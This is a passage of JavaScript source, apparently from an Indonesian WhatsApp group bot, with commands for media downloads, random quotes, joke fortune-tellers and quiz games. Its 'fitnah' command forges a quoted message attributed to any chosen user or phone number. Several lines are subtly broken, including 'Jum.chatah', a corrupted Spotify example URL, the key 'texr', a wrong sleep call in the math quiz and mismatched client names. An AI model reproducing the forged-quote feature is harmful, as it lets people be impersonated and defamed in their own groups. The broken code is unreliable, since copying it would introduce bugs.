					setLimit(m, db)
				} catch (e) {
					try {
						let anu = await fetchApi('/download/mediafire', { url: text })
						await Avishka.sendMedia(m.chat, anu.data.url, anu.data.filename, `*MEDIAFIRE DOWNLOADER*\n\n*${setv} Name* : ${anu.data.filename}\n*${setv} Size* : ${anu.data.size}`, m)
						setLimit(m, db)
					} catch (e) {
						m.reply('Server download sedang offline!')
					}
				}
			}
				break
			case 'spotifydl': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} https://open.spotify.com/track/0JiVRyTJcJnm.chatwCZ854K4p`)
				if (!isUrl(args[0]) && !args[0].includes('open.spotify.com/track')) return m.reply('Url Invalid!')
				try {
					const hasil = await spotifyDl(text);
					m.reply(mess.wait)
					await m.reply({
						audio: { url: hasil.download },
						mimetype: 'audio/mpeg',
						contextInfo: {
							externalAdReply: {
								title: hasil.title,
								body: clockString(hasil.duration),
								previewType: 'PHOTO',
								thumbnailUrl: hasil.cover,
								mediaType: 1,
								renderLargerThumbnail: true,
								sourceUrl: text
							}
						}
					})
					setLimit(m, db)
				} catch (e) {
					m.reply('Server download sedang offline!')
				}
			}
				break

			// Quotes Menu
			case 'motivasi': {
				const hasil = await fetchJson('https://raw.githubusercontent.com/session/database/refs/heads/master/kata-kata/motivasi.json');
				m.reply(pickRandom(hasil))
			}
				break
			case 'bijak': {
				const hasil = await fetchJson('https://raw.githubusercontent.com/session/database/refs/heads/master/kata-kata/bijak.json');
				m.reply(pickRandom(hasil))
			}
				break
			case 'dare': {
				const hasil = await fetchJson('https://raw.githubusercontent.com/session/database/refs/heads/master/kata-kata/dare.json');
				m.reply(pickRandom(hasil))
			}
				break
			case 'quotes': {
				const res = await fetchJson('https://raw.githubusercontent.com/session/database/refs/heads/master/kata-kata/quotes.json');
				const hasil = pickRandom(res);
				m.reply(`_${hasil.quotes}_\n\n*- ${hasil.author}*`)
			}
				break
			case 'truth': {
				const hasil = await fetchJson('https://raw.githubusercontent.com/session/database/refs/heads/master/kata-kata/truth.json');
				m.reply(`_${pickRandom(hasil)}_`)
			}
				break
			case 'renungan': {
				const hasil = await fetchJson('https://raw.githubusercontent.com/session/database/refs/heads/master/kata-kata/renungan.json');
				m.reply('', {
					contextInfo: {
						forwardingScore: 10,
						isForwarded: true,
						externalAdReply: {
							title: (m.pushName || 'Anonim'),
							thumbnailUrl: pickRandom(hasil),
							mediaType: 1,
							previewType: 'PHOTO',
							renderLargerThumbnail: true,
						}
					}
				});
			}
				break
			case 'bucin': {
				const hasil = await fetchJson('https://raw.githubusercontent.com/session/database/refs/heads/master/kata-kata/bucin.json');
				m.reply(pickRandom(hasil))
			}
				break

			// Random Menu
			case 'coffe': case 'kopi': {
				try {
					await Avishka.sendFileUrl(m.chat, 'https://coffee.alexflipnote.dev/random', '☕ Random Coffe', m)
				} catch (e) {
					try {
						const anu = await fetchJson('https://api.sampleapis.com/coffee/hot')
						await Avishka.sendFileUrl(m.chat, pickRandom(anu).image, '☕ Random Coffe', m)
					} catch (e) {
						m.reply('Server Sedang Offline!')
					}
				}
			}
				break
			case 'golden': {
				if (!text) {
					return m.reply(`Example: ${prefix + command} text`);
				}
				try {
					m.react('⏳')
					const url = `https://gtech-api-xtp1.onrender.com/api/ephoto/golden?text=${encodeURIComponent(text)}&apikey=${apikey}`;
					const response = await fetch(url);
					if (!response.ok) throw new Error('Network response was not ok');
					const data = await response.json();
					if (!data.status || !data.result || !data.result.imageUrl) throw new Error('Invalid API response');
					await qasim.sendFileUrl(m.chat, data.result.imageUrl, `${text}`, m);
					m.react('✅')
				} catch (e) {
					m.react('❎')
					m.reply('Server Offline or Data Unavailable!');
				}
			}
				break

			case 'mascot': {
				if (!text) {
					return m.reply(`Example: ${prefix + command} text`);
				}
				try {
					m.react('⏳')
					const url = `https://gtech-api-xtp1.onrender.com/api/ephoto/mascot?text=${encodeURIComponent(text)}&apikey=${apikey}`;
					const response = await fetch(url);
					if (!response.ok) throw new Error('Network response was not ok');
					const data = await response.json();
					if (!data.status || !data.result || !data.result.imageUrl) throw new Error('Invalid API response');
					await qasim.sendFileUrl(m.chat, data.result.imageUrl, `${text}`, m);
					m.react('✅')
				} catch (e) {
					m.react('❎')
					m.reply('Server Offline or Data Unavailable!');
				}
			}
				break

			// Anime Menu
			case 'waifuu': {
				try {
					if (!isNsfw && text === 'nsfw') return m.reply('Filter Nsfw Sedang Aktif!')
					const res = await fetchJson('https://api.waifu.pics/' + (text === 'nsfw' ? 'nsfw' : 'sfw') + '/' + command)
					await Avishka.sendFileUrl(m.chat, res.url, 'Random Waifu', m)
					setLimit(m, db)
				} catch (e) {
					m.reply('Server sedang offline!')
				}
			}
				break

			// Fun Menu
			case 'dadu': {
				let ddsa = [{ url: 'https://telegra.ph/file/9f60e4cdbeb79fc6aff7a.png', no: 1 }, { url: 'https://telegra.ph/file/797f86e444755282374ef.png', no: 2 }, { url: 'https://telegra.ph/file/970d2a7656ada7c579b69.png', no: 3 }, { url: 'https://telegra.ph/file/0470d295e00ebe789fb4d.png', no: 4 }, { url: 'https://telegra.ph/file/a9d7332e7ba1d1d26a2be.png', no: 5 }, { url: 'https://telegra.ph/file/99dcd999991a79f9ba0c0.png', no: 6 }]
				let media = pickRandom(ddsa)
				try {
					await Avishka.sendAsSticker(m.chat, media.url, m, { packname: packname, author: author, isAvatar: 1 })
				} catch (e) {
					let anu = await fetch(media.url)
					let una = await anu.buffer()
					await Avishka.sendAsSticker(m.chat, una, m, { packname: packname, author: author, isAvatar: 1 })
				}
			}
				break
			case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh': {
				if (!m.quoted && !text) return m.reply(`Kirim/reply text dengan caption ${prefix + command}`)
				ter = command[1].toLowerCase()
				tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
				m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
			}
				break
			case 'bisakah': {
				if (!text) return m.reply(`Example : ${prefix + command} saya menang?`)
				let bisa = ['Bisa', 'Coba Saja', 'Pasti Bisa', 'Mungkin Saja', 'Tidak Bisa', 'Tidak Mungkin', 'Coba Ulangi', 'Ngimpi kah?', 'yakin bisa?']
				let keh = bisa[Math.floor(Math.random() * bisa.length)]
				m.reply(`*Bisakah ${text}*\nJawab : ${keh}`)
			}
				break
			case 'apakah': {
				if (!text) return m.reply(`Example : ${prefix + command} saya bisa menang?`)
				let apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Coba Ulangi', 'Mungkin Saja', 'Mungkin Tidak', 'Mungkin Iya', 'Ntahlah']
				let kah = apa[Math.floor(Math.random() * apa.length)]
				m.reply(`*${command} ${text}*\nJawab : ${kah}`)
			}
				break
			case 'kapan': case 'kapankah': {
				if (!text) return m.reply(`Example : ${prefix + command} saya menang?`)
				let kapan = ['Besok', 'Lusa', 'Nanti', '4 Hari Lagi', '5 Hari Lagi', '6 Hari Lagi', '1 Minggu Lagi', '2 Minggu Lagi', '3 Minggu Lagi', '1 Bulan Lagi', '2 Bulan Lagi', '3 Bulan Lagi', '4 Bulan Lagi', '5 Bulan Lagi', '6 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', '6 Tahun Lagi', '1 Abad lagi', '3 Hari Lagi', 'Bulan Depan', 'Ntahlah', 'Tidak Akan Pernah']
				let koh = kapan[Math.floor(Math.random() * kapan.length)]
				m.reply(`*${command} ${text}*\nJawab : ${koh}`)
			}
				break
			case 'siapa': case 'siapakah': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!text) return m.reply(`Example : ${prefix + command} jawa?`)
				let member = (store.groupMetadata[m.chat] ? store.groupMetadata[m.chat].participants : m.metadata.participants).map(a => a.id)
				let siapakh = pickRandom(member)
				m.reply(`@${siapakh.split('@')[0]}`);
			}
				break
			case 'tanyakerang': case 'kerangajaib': case 'kerang': {
				if (!text) return m.reply(`Example : ${prefix + command} boleh pinTimes 100?`)
				let krng = ['Mungkin suatu hari', 'Tidak juga', 'Tidak keduanya', 'Kurasa tidak', 'Ya', 'Tidak', 'Coba tanya lagi', 'Tidak ada']
				let jwb = pickRandom(krng)
				m.reply(`*Pertanyaan : ${text}*\n*Jawab : ${jwb}*`)
			}
				break
			case 'cekmati': {
				if (!text) return m.reply(`Example : ${prefix + command} nama lu`)
				let teksnya = text.replace(/@|[\uD800-\uDBFF][\uDC00-\uDFFF]/g, '').replace(/\d/g, '');
				let data = await axios.get(`https://api.agify.io/?name=${teksnya ? teksnya : 'bot'}`).then(res => res.data).catch(e => ({ age: Math.floor(Math.random() * 90) + 20 }));
				m.reply(`Nama : ${text}\n*Mati Pada Umur :* ${data.age == null ? (Math.floor(Math.random() * 90) + 20) : data.age} Tahun.\n\n_Cepet Cepet Tobat Bro_\n_Soalnya Mati ga ada yang tau_`)
			}
				break
			case 'ceksifat': {
				let sifat_a = ['Bijak', 'Sabar', 'Kreatif', 'Humoris', 'Mudah bergaul', 'Mandiri', 'Setia', 'Jujur', 'Dermawan', 'Idealis', 'Adil', 'Sopan', 'Tekun', 'Rajin', 'Pemaaf', 'Murah hati', 'Ceria', 'Percaya diri', 'Penyayang', 'Disiplin', 'Optimis', 'Berani', 'Bersyukur', 'Bertanggung jawab', 'Bisa diandalkan', 'Tenang', 'Kalem', 'Logis']
				let sifat_b = ['Sombong', 'Minder', 'Pendendam', 'Sensitif', 'Perfeksionis', 'Caper', 'Pelit', 'Egois', 'Pesimis', 'Penyendiri', 'Manipulatif', 'Labil', 'Penakut', 'Vulgar', 'Tidak setia', 'Pemalas', 'Kasar', 'Rumit', 'Boros', 'Keras kepala', 'Tidak bijak', 'Pembelot', 'Serakah', 'Tamak', 'Penggosip', 'Rasis', 'Ceroboh', 'Intoleran']
				let teks = `╭──❍「 *Cek Sifat* 」❍\n│• Sifat ${text && m.mentionedJid ? text : '@' + m.sender.split('@')[0]}${(text && m.mentionedJid ? '' : (`\n│• Nama : *${text ? text : m.pushName}*` || '\n│• Nama : *Tanpa Nama*'))}\n│• Orang yang : *${pickRandom(sifat_a)}*\n│• Kekurangan : *${pickRandom(sifat_b)}*\n│• Keberanian : *${Math.floor(Math.random() * 100)}%*\n│• Kepedulian : *${Math.floor(Math.random() * 100)}%*\n│• Kecemasan : *${Math.floor(Math.random() * 100)}%*\n│• Ketakutan : *${Math.floor(Math.random() * 100)}%*\n│• Akhlak Baik : *${Math.floor(Math.random() * 100)}%*\n│• Akhlak Buruk : *${Math.floor(Math.random() * 100)}%*\n╰──────❍`
				m.reply(teks)
			}
				break
			case 'cekkhodam': {
				if (!text) return m.reply(`Example : ${prefix + command} nama lu`)
				try {
					const res = await fetchJson('https://raw.githubusercontent.com/session/database/refs/heads/master/random/cekkhodam.json');
					const hasil = pickRandom(res);
					m.reply(`Khodam dari *${text}* adalah *${hasil.nama}*\n_${hasil.deskripsi}_`)
				} catch (e) {
					m.reply(pickRandom(['Dokter Indosiar', 'Sigit Rendang', 'Ustadz Sinetron', 'Bocil epep']))
				}
			}
				break
			case 'rate': case 'nilai': {
				m.reply(`Rate Bot : *${Math.floor(Math.random() * 100)}%*`)
			}
				break
			case 'jodohku': {
				if (!m.isGroup) return m.reply(mess.group)
				let member = (store.groupMetadata?.[m.chat]?.participants || groupCache.get(m.chat)?.participants || m.metadata?.participants || []).map(a => a.id)
				let jodoh = pickRandom(member)
				m.reply(`👫Jodoh mu adalah\n@${m.sender.split('@')[0]} ❤ @${jodoh ? jodoh.split('@')[0] : '0'}`);
			}
				break
			case 'jadian': {
				if (!m.isGroup) return m.reply(mess.group)
				let member = (store.groupMetadata?.[m.chat]?.participants || groupCache.get(m.chat)?.participants || m.metadata?.participants || []).map(a => a.id)
				let jadian1 = pickRandom(member)
				let jadian2 = pickRandom(member)
				m.reply(`Ciee yang Jadian💖 Jangan lupa Donasi🗿\n@${jadian1.split('@')[0]} ❤ @${jadian2.split('@')[0]}`);
			}
				break
			case 'fitnah': {
				let [teks1, teks2, teks3] = text.split`|`
				if (!teks1 || !teks2 || !teks3) return m.reply(`Example : ${prefix + command} pesan target|pesan mu|nomer/tag target`)
				let ftelo = { key: { fromMe: false, participant: teks3.replace(/[^0-9]/g, '') + '@s.whatsapp.net', ...(m.isGroup ? { remoteJid: m.chat } : { remoteJid: teks3.replace(/[^0-9]/g, '') + '@s.whatsapp.net' }) }, message: { conversation: teks1 } }
				Avishka.sendMessage(m.chat, { text: teks2 }, { quoted: ftelo });
			}
				break
			case 'coba': {
				let anu = ['Aku Monyet', 'Aku Kera', 'Aku Tolol', 'Aku Kaya', 'Aku Dewa', 'Aku Anjing', 'Aku Dongo', 'Aku Raja', 'Aku Sultan', 'Aku Baik', 'Aku Hitam', 'Aku Suki']
				await Avishka.sendButtonMsg(m.chat, {
					text: 'Semoga Hoki😹',
					buttons: [{
						buttonId: 'teshoki',
						buttonText: { displayText: '\n' + pickRandom(anu) },
						type: 1
					}, {
						buttonId: 'cobacoba',
						buttonText: { displayText: '\n' + pickRandom(anu) },
						type: 1
					}]
				})
			}
				break

			// Game Menu
			case 'slot': {
				await gameSlot(Avishka, m, db)
			}
				break
			case 'casino': {
				await gameCasinoSolo(Avishka, m, prefix, db)
			}
				break
			case 'samgong': case 'kartu': {
				await gameSamgongSolo(Avishka, m, db)
			}
				break
			case 'rampok': case 'merampok': {
				await gameMerampok(m, db)
			}
				break
			case 'begal': {
				await gameBegal(Avishka, m, db)
			}
				break
			case 'suitpvp': case 'suit': {
				if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) return m.reply(`Selesaikan suit mu yang sebelumnya`)
				if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
				if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[0]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
				if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return m.reply(`Orang yang kamu tantang sedang bermain suit bersama orang lain :(`)
				let caption = `_*SUIT PvP*_\n\n@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit\n\nSilahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
				let id = 'suit_' + Date.now();
				suit[id] = {
					chat: caption,
					id: id,
					p: m.sender,
					p2: m.mentionedJid[0],
					status: 'wait',
					poin: 10,
					poin_lose: 10,
					timeout: 3 * 60 * 1000
				}
				m.reply(caption)
				await sleep(3 * 60 * 1000)
				if (suit[id]) {
					m.reply(`_Waktu suit habis_`)
					delete suit[id]
				}
			}
				break
			case 'delsuit': case 'deletesuit': {
				let roomnya = Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))
				if (!roomnya) return m.reply(`Kamu sedang tidak berada di room suit !`)
				delete suit[roomnya.id]
				m.reply(`Berhasil delete session room suit !`)
			}
				break
			case 'ttc': case 'ttt': case 'tictactoe': {
				if (Object.values(tictactoe).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply(`Kamu masih didalam game!\nKetik *${prefix}del${command}* Jika Ingin Mengakhiri sesi`);
				let room = Object.values(tictactoe).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
				if (room) {
					m.reply('Partner ditemukan!')
					room.o = m.chat
					room.game.playerO = m.sender
					room.state = 'PLAYING'
					if (!(room.game instanceof TicTacToe)) {
						room.game = Object.assign(new TicTacToe(room.game.playerX, room.game.playerO), room.game)
					}
					let arr = room.game.render().map(v => {
						return { X: '❌', O: '⭕', 1: '1️⃣', 2: '2️⃣', 3: '3️⃣', 4: '4️⃣', 5: '5️⃣', 6: '6️⃣', 7: '7️⃣', 8: '8️⃣', 9: '9️⃣' }[v]
					})
					let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\nMenunggu @${room.game.currentTurn.split('@')[0]}\n\nKetik *nyerah* untuk menyerah dan mengakui kekalahan`
					if (room.x !== room.o) await Avishka.sendMessage(room.x, { texr: str, mentions: parseMention(str) }, { quoted: m })
					await Avishka.sendMessage(room.o, { text: str, mentions: parseMention(str) }, { quoted: m })
				} else {
					room = {
						id: 'tictactoe-' + (+new Date),
						x: m.chat,
						o: '',
						game: new TicTacToe(m.sender, 'o'),
						state: 'WAITING',
					}
					if (text) room.name = text
					Avishka.sendMessage(m.chat, { text: 'Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''), mentions: m.mentionedJid }, { quoted: m })
					tictactoe[room.id] = room
					await sleep(300000)
					if (tictactoe[room.id]) {
						m.reply(`_Waktu ${command} habis_`)
						delete tictactoe[room.id]
					}
				}
			}
				break
			case 'delttc': case 'delttt': {
				let roomnya = Object.values(tictactoe).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
				if (!roomnya) return m.reply(`Kamu sedang tidak berada di room tictactoe !`)
				delete tictactoe[roomnya.id]
				m.reply(`Berhasil delete session room tictactoe !`)
			}
				break
			case 'akinator': {
				if (text == 'start') {
					if (akinator[m.sender]) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
					akinator[m.sender] = new Akinator({ region: 'id', childMode: false });
					try {
						await akinator[m.sender].start()
					} catch (e) {
						delete akinator[m.sender];
						return m.reply('Server Akinator Sedang Gangguan\nSilahkan coba lagi nanti!')
					}
					let { key } = await m.reply(`🎮 Akinator Game :\n\n@${m.sender.split('@')[0]}\n${akinator[m.sender].question}\n\n- 0 - Ya\n- 1 - Tidak\n- 2 - Tidak Tau\n- 3 - Mungkin\n- 4 - Mungkin Tidak\n\n${prefix + command} end (Untuk Keluar dari sesi)`)
					akinator[m.sender].key = key.id
					await sleep(3600000)
					if (akinator[m.sender]) {
						m.reply(`_Waktu ${command} habis_`)
						delete akinator[m.sender];
					}
				} else if (text == 'end') {
					if (!akinator[m.sender]) return m.reply('Kamu tidak Sedang bermain Akinator!')
					delete akinator[m.sender];
					m.reply('Success Mengakhiri sessi Akinator')
				} else m.reply(`Example : ${prefix + command} start/end`)
			}
				break
			case 'tebakbom': {
				if (tebakbom[m.sender]) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				tebakbom[m.sender] = {
					petak: [0, 0, 0, 2, 0, 2, 0, 2, 0, 0].sort(() => Math.random() - 0.5),
					board: ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟'],
					bomb: 3,
					lolos: 7,
					pick: 0,
					nyawa: ['❤️', '❤️', '❤️'],
				}
				await m.reply(`*TEBAK BOM*\n\n${tebakbom[m.sender].board.join("")}\n\nPilih lah nomor tersebut! dan jangan sampai terkena Bom!\nBomb : ${tebakbom[m.sender].bomb}\nNyawa : ${tebakbom[m.sender].nyawa.join("")}`);
				await sleep(120000)
				if (tebakbom[m.sender]) {
					m.reply(`_Waktu ${command} habis_`)
					delete tebakbom[m.sender];
				}
			}
				break
			case 'tekateki': {
				if (iGame(tekateki, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tekateki.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Teka Teki Berikut :\n\n${hasil.soal}\n\nWaktu : 60s\nHadiah *+3499*`)
				tekateki[m.chat + key.id] = {
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tekateki, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tekateki[m.chat + key.id].jawaban)
					delete tekateki[m.chat + key.id]
				}
			}
				break
			case 'tebaklirik': {
				if (iGame(tebaklirik, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebaklirik.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Tebak Lirik Berikut :\n\n${hasil.soal}\n\nWaktu : 90s\nHadiah *+4299*`)
				tebaklirik[m.chat + key.id] = {
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(90000)
				if (rdGame(tebaklirik, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tebaklirik[m.chat + key.id].jawaban)
					delete tebaklirik[m.chat + key.id]
				}
			}
				break
			case 'tebakkata': {
				if (iGame(tebakkata, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebakkata.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Tebak Kata Berikut :\n\n${hasil.soal}\n\nWaktu : 60s\nHadiah *+3499*`)
				tebakkata[m.chat + key.id] = {
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebakkata, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tebakkata[m.chat + key.id].jawaban)
					delete tebakkata[m.chat + key.id]
				}
			}
				break
			case 'family100': {
				if (family100.hasOwnProperty(m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/family100.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Tebak Kata Berikut :\n\n${hasil.soal}\n\nWaktu : 5m\nHadiah *+3499*`)
				family100[m.chat] = {
					soal: hasil.soal,
					jawaban: hasil.jawaban,
					terjawab: Array.from(hasil.jawaban, () => false),
					id: key.id
				}
				await sleep(300000)
				if (family100.hasOwnProperty(m.chat)) {
					m.reply('Waktu Habis\nJawaban:\n- ' + family100[m.chat].jawaban.join('\n- '))
					delete family100[m.chat]
				}
			}
				break
			case 'susunkata': {
				if (iGame(susunkata, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/susunkata.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Susun Kata Berikut :\n\n${hasil.soal}\nTipe : ${hasil.tipe}\n\nWaktu : 60s\nHadiah *+2989*`)
				susunkata[m.chat + key.id] = {
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(susunkata, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + susunkata[m.chat + key.id].jawaban)
					delete susunkata[m.chat + key.id]
				}
			}
				break
			case 'tebakkimia': {
				if (iGame(tebakkimia, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebakkimia.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Tebak Kimia Berikut :\n\n${hasil.unsur}\n\nWaktu : 60s\nHadiah *+3499*`)
				tebakkimia[m.chat + key.id] = {
					jawaban: hasil.lambang.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebakkimia, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tebakkimia[m.chat + key.id].jawaban)
					delete tebakkimia[m.chat + key.id]
				}
			}
				break
			case 'caklontong': {
				if (iGame(caklontong, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/caklontong.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Jawab Pertanyaan Berikut :\n\n${hasil.soal}\n\nWaktu : 60s\nHadiah *+9999*`)
				caklontong[m.chat + key.id] = {
					...hasil,
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(caklontong, m.chat, key.id)) {
					m.reply(`Waktu Habis\nJawaban: ${caklontong[m.chat + key.id].jawaban}\n"${caklontong[m.chat + key.id].deskripsi}"`)
					delete caklontong[m.chat + key.id]
				}
			}
				break
			case 'tebaknegara': {
				if (iGame(tebaknegara, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebaknegara.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Tebak Negara Dari Tempat Berikut :\n\n*Tempat : ${hasil.tempat}*\n\nWaktu : 60s\nHadiah *+3499*`)
				tebaknegara[m.chat + key.id] = {
					jawaban: hasil.negara.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebaknegara, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tebaknegara[m.chat + key.id].jawaban)
					delete tebaknegara[m.chat + key.id]
				}
			}
				break
			case 'tebakgambar': {
				if (iGame(tebakgambar, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebakgambar.json');
				const hasil = pickRandom(soal);
				let { key } = await Avishka.sendFileUrl(m.chat, hasil.img, `🎮 Tebak Gambar Berikut :\n\n${hasil.deskripsi}\n\nWaktu : 60s\nHadiah *+3499*`, m)
				tebakgambar[m.chat + key.id] = {
					jawaban: hasil.jawaban.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebakgambar, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tebakgambar[m.chat + key.id].jawaban)
					delete tebakgambar[m.chat + key.id]
				}
			}
				break
			case 'tebakbendera': {
				if (iGame(tebakbendera, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebakbendera.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply(`🎮 Tebak Bendera Berikut :\n\n*Bendera : ${hasil.bendera}*\n\nWaktu : 60s\nHadiah *+3499*`)
				tebakbendera[m.chat + key.id] = {
					jawaban: hasil.negara.toLowerCase(),
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebakbendera, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tebakbendera[m.chat + key.id].jawaban)
					delete tebakbendera[m.chat + key.id]
				}
			}
				break
			case 'tebakangka': case 'butawarna': case 'colorblind': {
				if (iGame(tebakangka, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				const soal = await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/random/color_blind.json');
				const hasil = pickRandom(soal);
				let { key } = await m.reply({
					text: `Pilih Jawaban Yang Benar!\nPilihan: ${[hasil.number, ...hasil.similar].sort(() => Math.random() - 0.5).join(', ')}`,
					contextInfo: {
						externalAdReply: {
							renderLargerThumbnail: true,
							thumbnailUrl: hasil.color_blind[0],
							body: `Level : ${hasil.lv}`,
							previewType: 0,
							mediaType: 1,
						}
					}
				});
				tebakangka[m.chat + key.id] = {
					jawaban: hasil.number,
					id: key.id
				}
				await sleep(60000)
				if (rdGame(tebakangka, m.chat, key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + tebakangka[m.chat + key.id].jawaban)
					delete tebakangka[m.chat + key.id]
				}
			}
				break
			case 'kuismath': case 'math': {
				const { genMath, modes } = require('./lib/math');
				const inputMode = ['noob', 'easy', 'medium', 'hard', 'extreme', 'impossible', 'impossible2'];
				if (iGame(kuismath, m.chat)) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				if (!text) return m.reply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
				if (!inputMode.includes(text.toLowerCase())) return m.reply('Mode tidak ditemukan!')
				let result = await genMath(text.toLowerCase())
				let { key } = await m.reply(`*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu : ${(result.waktu / 1000).toFixed(2)} detik`)
				kuismath[m.chat + key.id] = {
					jawaban: result.jawaban,
					mode: text.toLowerCase(),
					id: key.id
				}
				await sleep(kuismath, result.waktu)
				if (rdGame(m.chat + key.id)) {
					m.reply('Waktu Habis\nJawaban: ' + kuismath[m.chat + key.id].jawaban)
					delete kuismath[m.chat + key.id]
				}
			}
				break
				
				
				
			case 'ulartangga': case 'snakeladder': case 'ut': {
				if (!m.isGroup) return m.reply(mess.group)
				if (ulartangga[m.chat] && !(ulartangga[m.chat] instanceof SnakeLadder)) {
					ulartangga[m.chat] = Object.assign(new SnakeLadder(ulartangga[m.chat]), ulartangga[m.chat]);
				}
				switch (args[0]) {
					case 'create': case 'join':
						if (ulartangga[m.chat]) {
							if (Object.keys(ulartangga[m.chat].players).length > 8) return m.reply(`Jum.chatah Pemain Sudah Maksimal\nSilahkan Memulai Permainan\n${prefix + command} start`);
							if (ulartangga[m.chat].players.some(a => a.id == m.sender)) return m.reply('Kamu Sudah Bergabung!')
							ulartangga[m.chat].players.push({ id: m.sender, move: 0 });
							m.reply('Success Join Sesi Game')
						} else {
							ulartangga[m.chat] = new SnakeLadder({ id: m.chat, host: m.sender });
							ulartangga[m.chat].players.push({ id: m.sender, move: 0 });
							ulartangga[m.chat].time = Date.now();
							m.reply('Success Membuat Sesi Game')
						}
						break
					case 'start':
						if (!ulartangga[m.chat]) return m.reply('Tidak Ada Sesi Yang Sedang Berlangsung!')
